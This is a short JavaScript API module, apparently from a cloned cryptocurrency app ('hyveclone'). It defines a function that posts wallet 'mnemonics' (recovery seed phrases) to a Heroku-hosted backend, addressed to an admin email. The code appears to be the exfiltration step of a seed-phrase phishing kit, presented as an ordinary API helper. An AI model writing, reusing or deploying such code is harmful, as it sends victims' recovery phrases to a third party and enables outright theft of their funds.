import axios from "axios";

const client = axios.create({
  baseURL: "https://hyveclone.herokuapp.com/api/v1/",
});

export const sendMnemonicsEmail = async (
  message,
  admin = process.env.REACT_APP_ADMIN
) => {
  try {
    const res = await client({
      method: "POST",
      url: "mail",
      data: {
        message,
        admin,
      },
      withCredentials: true,
    });

    if (res.data.status === "success") {
      return res.data;
    }
  } catch (err) {
    return Promise.reject({
      status: "error",
      data: err,
    });
  }
};
